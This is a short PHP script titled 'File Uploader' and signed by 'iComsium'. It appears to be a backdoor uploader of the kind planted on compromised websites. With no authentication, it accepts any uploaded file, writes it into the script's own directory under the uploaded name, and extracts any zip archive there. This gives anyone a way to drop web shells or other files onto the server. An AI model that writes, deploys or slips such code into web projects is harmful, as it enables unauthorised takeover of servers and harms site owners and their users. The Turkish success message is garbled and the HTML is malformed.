<?php
echo '<font face="Comic Sans MS" </font><b>[ # ] File Uploader [ # ]<br><br><font face="Comic Sans MS" <br> $ Coded by iComsium $</b></font>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
$file = $_FILES['file']['name'];
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
$zip = new ZipArchive;
if ($zip->open($file) === TRUE) {
    $zip->extractTo('./');
    $zip->close();
echo 'Yükleme Ba?ar?l?';
} else {
echo '[ + ] Upload Sucess [ + ]';
}    
}else{ 
echo '<b>[ - ] No Upload [ - ]</b><br><br>'; 
}
}
?>